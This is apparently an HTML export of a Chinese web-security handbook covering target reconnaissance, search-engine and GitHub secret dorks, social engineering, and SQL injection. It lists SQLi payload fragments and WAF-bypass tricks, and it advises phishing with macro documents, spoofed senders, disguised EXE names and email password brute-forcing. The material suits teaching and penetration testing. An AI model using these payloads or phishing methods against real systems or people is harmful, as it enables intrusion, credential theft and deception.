<h4>批量搜索<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Censys</li>
<li>Shodan</li>
<li>ZoomEye</li>
</ul>
</div>
</div>
<span id="document-info/site"></span><div class="section" id="id1">
<h3>站点信息<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<ul class="simple">
<li><dl class="first docutils">
<dt>判断网站操作系统</dt>
<dd><ul class="first last">
<li>Linux大小写敏感</li>
<li>Windows大小写不敏感</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>扫描敏感文件</dt>
<dd><ul class="first last">
<li>robots.txt</li>
<li>crossdomain.xml</li>
<li>sitemap.xml</li>
<li>xx.tar.gz</li>
<li>xx.bak</li>
<li>等</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>确定网站采用的语言</dt>
<dd><ul class="first last">
<li>如PHP / Java / Python等</li>
<li>找后缀，比如php/asp/jsp</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>前端框架</dt>
<dd><ul class="first last">
<li>如jQuery / BootStrap / Vue / React / Angular等</li>
<li>查看源代码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>中间服务器</dt>
<dd><ul class="first last">
<li>如 Apache / Nginx / IIS 等</li>
<li>查看header中的信息</li>
<li>根据报错信息判断</li>
<li>根据默认页面判断</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Web容器服务器</dt>
<dd><ul class="first last">
<li>如Tomcat / Jboss / Weblogic等</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>后端框架</dt>
<dd><ul class="first last">
<li>根据Cookie判断</li>
<li>根据CSS / 图片等资源的hash值判断</li>
<li><dl class="first docutils">
<dt>根据URL路由判断</dt>
<dd><ul class="first last">
<li>如wp-admin</li>
</ul>
</dd>
</dl>
</li>
<li>根据网页中的关键字判断</li>
<li>根据响应头中的X-Powered-By</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CDN信息</dt>
<dd><ul class="first last">
<li>常见的有Cloudflare、yunjiasu</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>探测有没有WAF，如果有，什么类型的</dt>
<dd><ul class="first last">
<li>有WAF，找绕过方式</li>
<li>没有，进入下一步</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>扫描敏感目录，看是否存在信息泄漏</dt>
<dd><ul class="first last">
<li>扫描之前先自己尝试几个的url，人为看看反应</li>
</ul>
</dd>
</dl>
</li>
<li>使用爬虫爬取网站信息</li>
<li>拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名</li>
<li><dl class="first docutils">
<dt>常见入口目标</dt>
<dd><ul class="first last">
<li>关注度低的系统</li>
<li>业务线较长的系统</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<span id="document-info/searchEngine"></span><div class="section" id="id1">
<h3>搜索引擎利用<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<p>恰当地使用搜索引擎（Google/Bing/Yahoo/Baidu等）可以获取目标站点的较多信息。</p>
<div class="section" id="id2">
<h4>搜索引擎处理流程<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>数据预处理</dt>
<dd><ul class="first last">
<li>长度截断</li>
<li>大小写转化</li>
<li>去标点符号</li>
<li>简繁转换</li>
<li>数字归一化，中文数字、阿拉伯数字、罗马字</li>
<li>同义词改写</li>
<li>拼音改写</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>处理</dt>
<dd><ul class="first last">
<li>分词</li>
<li>关键词抽取</li>
<li>非法信息过滤</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id3">
<h4>搜索技巧<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>site:www.hao123.com</dt>
<dd><ul class="first last">
<li>返回此目标站点被搜索引擎抓取收录的所有内容</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>site:www.hao123.com keyword</dt>
<dd><ul class="first last">
<li>返回此目标站点被搜索引擎抓取收录的包含此关键词的所有页面</li>
<li>此处可以将关键词设定为网站后台，管理后台，密码修改，密码找回等</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>site:www.hao123.com inurl:admin.php</dt>
<dd><ul class="first last">
<li>返回目标站点的地址中包含admin.php的所有页面，可以使用admin.php/manage.php或者其他关键词来寻找关键功能页面</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>link:www.hao123.com</dt>
<dd><ul class="first last">
<li>返回所有包含目标站点链接的页面，其中包括其开发人员的个人博客，开发日志，或者开放这个站点的第三方公司，合作伙伴等</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>related:www.hao123.com</dt>
<dd><ul class="first last">
<li>返回所有与目标站点”相似”的页面，可能会包含一些通用程序的信息等</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>intitle:&quot;500 Internal Server Error&quot; &quot;server at&quot;</dt>
<dd><ul class="first last">
<li>搜索出错的页面</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>inurl:&quot;nph-proxy.cgi&quot; &quot;Start browsing&quot;</dt>
<dd><ul class="first last">
<li>查找代理服务器</li>
</ul>
</dd>
</dl>
</li>
</ul>
<p>除了以上的关键字，还有allintile / allinurl / allintext / inanchor / intext  / filetype / info / numberange / cache等。</p>
<div class="section" id="id4">
<h5>通配符<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">*</span></code> 代表某一个单词</li>
<li>OR 或者 | 代表逻辑或</li>
<li>单词前跟 <code class="docutils literal notranslate"><span class="pre">+</span></code> 表强制查询</li>
<li>单词前跟 <code class="docutils literal notranslate"><span class="pre">-</span></code> 表排除对应关键字</li>
<li><code class="docutils literal notranslate"><span class="pre">&quot;</span></code> 强调关键字</li>
</ul>
</div>
<div class="section" id="tips">
<h5>tips<a class="headerlink" href="#tips" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>查询不区分大小写</li>
<li>括号会被忽略</li>
<li>默认用 and 逻辑进行搜索</li>
</ul>
</div>
</div>
<div class="section" id="id5">
<h4>快照<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>搜索引擎的快照中也常包含一些关键信息，如程序报错信息可以会泄漏网站具体路径，或者一些快照中会保存一些测试用的测试信息，比如说某个网站在开发了后台功能模块的时候，还没给所有页面增加权限鉴别，此时被搜索引擎抓取了快照，即使后来网站增加了权限鉴别，但搜索引擎的快照中仍会保留这些信息。</p>
<p>另外也有专门的站点快照提供快照功能，如 Wayback Machine 和 <a class="reference external" href="https://archive.org/">Archive.org</a> 等。</p>
</div>
<div class="section" id="github">
<h4>Github<a class="headerlink" href="#github" title="永久链接至标题">¶</a></h4>
<p>在Github中，可能会存在源码泄露、AccessKey泄露、密码、服务器配置泄露等情况，常见的搜索技巧有：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&#64;example.com</span> <span class="pre">password/pass/pwd/secret/credentials/token</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;example.com</span> <span class="pre">username/user/key/login/ftp/</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;example.com</span> <span class="pre">config/ftp/smtp/pop</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;example.com</span> <span class="pre">security_credentials/connetionstring</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;example.com</span> <span class="pre">JDBC/ssh2_auth_password/send_keys</span></code></li>
</ul>
</div>
</div>
<span id="document-info/social"></span><div class="section" id="id1">
<h3>社会工程学<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>企业信息收集<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>一些网站如天眼查等，可以提供企业关系挖掘、工商信息、商标专利、企业年报等信息查询，可以提供企业的较为细致的信息。</p>
<p>公司主站中会有业务方向、合作单位等信息。</p>
</div>
<div class="section" id="id3">
<h4>人员信息收集<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>针对人员的信息收集考虑对目标重要人员、组织架构、社会关系的收集和分析。其中重要人员主要指高管、系统管理员、运维、财务、人事、业务人员的个人电脑。</p>
<p>人员信息收集较容易的入口点是网站，网站中可能包含网站的开发、管理维护等人员的信息。从网站联系功能中和代码的注释信息中都可能得到的所有开发及维护人员的姓名和邮件地址及其他联系方式。</p>
<p>在获取这些信息后，可以在Github/Linkedin等社交、招聘网站中进一步查找这些人在互联网上发布的与目标站点有关的一切信息，分析并发现有用的信息。</p>
<p>此外，可以对获取到的邮箱进行密码爆破的操作，获取对应的密码。</p>
</div>
<div class="section" id="id4">
<h4>钓鱼<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>基于之前收集到的信息，可以使用Office/CHM/RAR/EXE等文件制作钓鱼邮件发送至目标，进一步收集信息。</p>
<p>其中Office可以使用Office漏洞、宏、OLE对象、PPSX等方式构造利用文件。</p>
<p>Exe可以使用特殊的Unicode控制字符来构建容易混淆的文件名。</p>
<p>如果前期信息收集获取到了运维等人员的邮箱，可以使用运维人员的邮箱发送，如果未收集到相关的信息，可以使用伪造发送源的方式发送邮件。</p>
</div>
<div class="section" id="id5">
<h4>其他信息<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>公司的公众号、企业号、网站，员工的网盘、百度文库等可能会存在一些敏感信息，如VPN/堡垒机账号、TeamViewer账号、网络设备默认口令、服务器默认口令等。</p>
</div>
</div>
<span id="document-info/ref"></span><div class="section" id="id1">
<h3>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<ul class="simple">
<li><a class="reference external" href="http://www.91ri.org/15441.html">端口渗透总结</a></li>
<li><a class="reference external" href="https://paper.seebug.org/409">未授权访问总结</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/aatNjey3swZz7T4Yw_LqsQ">红队测试之邮箱打点</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/dqntjRLgcOD3D2bi1oDFAw">邮件伪造之SPF绕过的5种思路</a></li>
</ul>
</div>
</div>
</div>
<span id="document-vuln/index"></span><div class="section" id="id1">
<h2>常见漏洞攻防<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-vuln/sql/index"></span><div class="section" id="sql">
<h3>SQL注入<a class="headerlink" href="#sql" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-vuln/sql/classify"></span><div class="section" id="id1">
<h4>注入分类<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。
在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</p>
</div>
<div class="section" id="id3">
<h5>按技巧分类<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>根据使用的技巧，SQL注入类型可分为</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>盲注</dt>
<dd><ul class="first last">
<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>
<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>
</ul>
</dd>
</dl>
</li>
<li>报错注入：应用会显示全部或者部分的报错信息</li>
<li>堆叠注入：有的应用可以加入 <code class="docutils literal notranslate"><span class="pre">;</span></code> 后一次执行多条语句</li>
<li>其他</li>
</ul>
</div>
<div class="section" id="id4">
<h5>按获取数据的方式分类<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>另外也可以根据获取数据的方式分为3类</p>
<div class="section" id="inband">
<h6>inband<a class="headerlink" href="#inband" title="永久链接至标题">¶</a></h6>
<p>利用Web应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>
</div>
<div class="section" id="inference">
<h6>inference<a class="headerlink" href="#inference" title="永久链接至标题">¶</a></h6>
<p>通过Web的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注，
通过web应用的其他改变来推断数据。</p>
</div>
<div class="section" id="out-of-band-oob">
<h6>out of band (OOB)<a class="headerlink" href="#out-of-band-oob" title="永久链接至标题">¶</a></h6>
<p>通过其他传输方式来获得数据，比如DNS解析协议和电子邮件。</p>
</div>
</div>
</div>
<span id="document-vuln/sql/fuzz"></span><div class="section" id="id1">
<h4>注入检测<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>常见的注入点<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>GET/POST/PUT/DELETE参数</li>
<li>X-Forwarded-For</li>
<li>文件名</li>
</ul>
</div>
<div class="section" id="fuzz">
<h5>Fuzz注入点<a class="headerlink" href="#fuzz" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">'</span></code> / <code class="docutils literal notranslate"><span class="pre">&quot;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">1/1</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">1/0</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">and</span> <span class="pre">1=1</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&quot;</span> <span class="pre">and</span> <span class="pre">&quot;1&quot;=&quot;1</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">and</span> <span class="pre">1=2</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">or</span> <span class="pre">1=1</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">or</span> <span class="pre">1=</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">and</span> <span class="pre">'1'='1</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">+</span></code> <code class="docutils literal notranslate"><span class="pre">-</span></code> <code class="docutils literal notranslate"><span class="pre">^</span></code> <code class="docutils literal notranslate"><span class="pre">*</span></code> <code class="docutils literal notranslate"><span class="pre">%</span></code> <code class="docutils literal notranslate"><span class="pre">/</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;&lt;</span></code> <code class="docutils literal notranslate"><span class="pre">&gt;&gt;</span></code> <code class="docutils literal notranslate"><span class="pre">||</span></code> <code class="docutils literal notranslate"><span class="pre">|</span></code> <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> <code class="docutils literal notranslate"><span class="pre">&amp;&amp;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">~</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">!</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;</span></code></li>
<li>反引号执行</li>
</ul>
</div>
<div class="section" id="id3">
<h5>测试用常量<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&#64;&#64;version</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;&#64;servername</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;&#64;language</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;&#64;spid</span></code></li>
</ul>
</div>
<div class="section" id="id4">
<h5>测试列数<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>例如 <code class="docutils literal notranslate"><span class="pre">http://www.foo.com/index.asp?id=12+union+select+null,null--</span></code> ，不断增加 <code class="docutils literal notranslate"><span class="pre">null</span></code> 至不返回</p>
</div>
<div class="section" id="id5">
<h5>报错注入<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">1/0</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">1</span> <span class="pre">from</span> <span class="pre">(select</span> <span class="pre">count(*),concat(version(),floor(rand(0)*2))x</span> <span class="pre">from</span>&#160; <span class="pre">information_schema.tables</span> <span class="pre">group</span> <span class="pre">by</span> <span class="pre">x)a</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">extractvalue(1,</span> <span class="pre">concat(0x5c,(select</span> <span class="pre">user())))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">updatexml(0x3a,concat(1,(select</span> <span class="pre">user())),1)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">exp(~(SELECT</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">user())a))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ST_LatFromGeoHash((select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">user())a)b))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">GTID_SUBSET(version(),</span> <span class="pre">1)</span></code></li>
</ul>
<div class="section" id="geometric">
<h6>基于geometric的报错注入<a class="headerlink" href="#geometric" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">GeometryCollection((select</span> <span class="pre">*</span> <span class="pre">from</span> <span class="pre">(select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">user())a)b))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">polygon((select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">user())a)b))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">multipoint((select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">user())a)b))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">multilinestring((select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">user())a)b))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">LINESTRING((select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">user())a)b))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">multipolygon((select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">*</span> <span class="pre">from(select</span> <span class="pre">user())a)b))</span></code></li>
</ul>
<p>其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 <a class="reference external" href="https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04">commit 95825f</a> 。</p>
<p>而以上列表中基于geometric的报错注入在这个 <a class="reference external" href="https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978">commit 5caea4</a> 中被修复，在5.5.x较后的版本中同样不再生效。</p>
</div>
</div>
<div class="section" id="id6">
<h5>堆叠注入<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">;select</span> <span class="pre">1</span></code></li>
</ul>
</div>
<div class="section" id="id7">
<h5>注释符<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">#</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--+</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/*xxx*/</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/*!xxx*/</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/*!50000xxx*/</span></code></li>
</ul>
</div>
<div class="section" id="id8">
<h5>判断过滤规则<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>是否有trunc</li>
<li>是否过滤某个字符</li>
<li>是否过滤关键字</li>
<li>slash和编码</li>
</ul>
</div>
<div class="section" id="id9">
<h5>获取信息<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>判断数据库类型</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">and</span> <span class="pre">exists</span> <span class="pre">(select</span> <span class="pre">*</span> <span class="pre">from</span> <span class="pre">msysobjects</span> <span class="pre">)</span> <span class="pre">&gt;</span> <span class="pre">0</span></code> access数据库</li>
<li><code class="docutils literal notranslate"><span class="pre">and</span> <span class="pre">exists</span> <span class="pre">(select</span> <span class="pre">*</span> <span class="pre">from</span> <span class="pre">sysobjects</span> <span class="pre">)</span> <span class="pre">&gt;</span> <span class="pre">0</span></code> SQLServer数据库</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>判断数据库表</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">and</span> <span class="pre">exsits</span> <span class="pre">(select</span> <span class="pre">*</span> <span class="pre">from</span> <span class="pre">admin)</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>版本、主机名、用户名、库名</li>
<li><dl class="first docutils">
<dt>表和字段</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>确定字段数</dt>
<dd><ul class="first last">
<li>Order By</li>
<li>Select Into</li>
</ul>
</dd>
</dl>
</li>
<li>表名、列名</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id10">
<h5>测试权限<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>文件操作</dt>
<dd><ul class="first last">
<li>读敏感文件</li>
<li>写shell</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>带外通道</dt>
<dd><ul class="first last">
<li>网络请求</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<span id="document-vuln/sql/privilege"></span><div class="section" id="id1">
<h4>权限提升<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="udf">
<h5>UDF提权<a class="headerlink" href="#udf" title="永久链接至标题">¶</a></h5>
<p>UDF（User Defined Function，用户自定义函数）是MySQL提供的一个功能，可以通过编写DLL扩展为MySQL添加新函数，扩充其功能。</p>
<p>当获得MySQL权限之后，即可通过这种方式上传自定义的扩展文件，从MySQL中执行系统命令。</p>
</div>
</div>
<span id="document-vuln/sql/dbident"></span><div class="section" id="id1">
<h4>数据库检测<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="mysql">
<h5>MySQL<a class="headerlink" href="#mysql" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>sleep <code class="docutils literal notranslate"><span class="pre">sleep(1)</span></code></li>
<li>benchmark <code class="docutils literal notranslate"><span class="pre">BENCHMARK(5000000,</span> <span class="pre">MD5('test'))</span></code></li>
<li><dl class="first docutils">
<dt>字符串连接</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">'a'</span> <span class="pre">'b'</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">CONCAT('some','string')</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>version</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">&#64;&#64;version</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">version()</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>识别用函数</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">connection_id()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">last_insert_id()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">row_count()</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="oracle">
<h5>Oracle<a class="headerlink" href="#oracle" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>字符串连接</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">'a'||'oracle'</span> <span class="pre">--</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">CONCAT('some','string')</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>version</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">banner</span> <span class="pre">FROM</span> <span class="pre">v$version</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">banner</span> <span class="pre">FROM</span> <span class="pre">v$version</span> <span class="pre">WHERE</span> <span class="pre">rownum=1</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="sqlserver">
<h5>SQLServer<a class="headerlink" href="#sqlserver" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>WAITFOR <code class="docutils literal notranslate"><span class="pre">WAITFOR</span> <span class="pre">DELAY</span> <span class="pre">'00:00:10';</span></code></li>
<li>SERVERNAME <code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">&#64;&#64;SERVERNAME</span></code></li>
<li>version <code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">&#64;&#64;version</span></code></li>
<li><dl class="first docutils">
<dt>字符串连接</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">'some'+'string'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>常量</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">&#64;&#64;pack_received</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;&#64;rowcount</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="postgresql">
<h5>PostgreSQL<a class="headerlink" href="#postgresql" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>sleep <code class="docutils literal notranslate"><span class="pre">pg_sleep(1)</span></code></li>
</ul>
</div>
</div>
<span id="document-vuln/sql/bypass"></span><div class="section" id="id1">
<h4>绕过技巧<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>编码绕过</dt>
<dd><ul class="first last">
<li>大小写</li>
<li>url编码</li>
<li>html编码</li>
<li>十六进制编码</li>
<li>unicode编码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>注释</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">//</span></code> <code class="docutils literal notranslate"><span class="pre">--</span></code> <code class="docutils literal notranslate"><span class="pre">--</span> <span class="pre">+</span></code> <code class="docutils literal notranslate"><span class="pre">--</span> <span class="pre">-</span></code> <code class="docutils literal notranslate"><span class="pre">#</span></code> <code class="docutils literal notranslate"><span class="pre">/**/</span></code> <code class="docutils literal notranslate"><span class="pre">;%00</span></code></li>
<li>内联注释用的更多，它有一个特性 <code class="docutils literal notranslate"><span class="pre">/!**/</span></code> 只有MySQL能识别</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">index.php?id=-1</span> <span class="pre">/*!UNION*/</span> <span class="pre">/*!SELECT*/</span> <span class="pre">1,2,3</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>只过滤了一次时</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">union</span></code> =&gt; <code class="docutils literal notranslate"><span class="pre">ununionion</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>相同功能替换</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>函数替换</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">substring</span></code> / <code class="docutils literal notranslate"><span class="pre">mid</span></code> / <code class="docutils literal notranslate"><span class="pre">sub</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ascii</span></code> / <code class="docutils literal notranslate"><span class="pre">hex</span></code> / <code class="docutils literal notranslate"><span class="pre">bin</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">benchmark</span></code> / <code class="docutils literal notranslate"><span class="pre">sleep</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>变量替换</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">user()</span></code> / <code class="docutils literal notranslate"><span class="pre">&#64;&#64;user</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>符号和关键字</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">and</span></code> / <code class="docutils literal notranslate"><span class="pre">&amp;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">or</span></code> / <code class="docutils literal notranslate"><span class="pre">|</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>HTTP参数</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>HTTP参数污染</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">id=1&amp;id=2&amp;id=3</span></code> 根据容器不同会有不同的结果</li>
</ul>
</dd>
</dl>
</li>
<li>HTTP分割注入</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>缓冲区溢出</dt>
<dd><ul class="first last">
<li>一些C语言的WAF处理的字符串长度有限，超出某个长度后的payload可能不会被处理</li>
</ul>
</dd>
</dl>
</li>
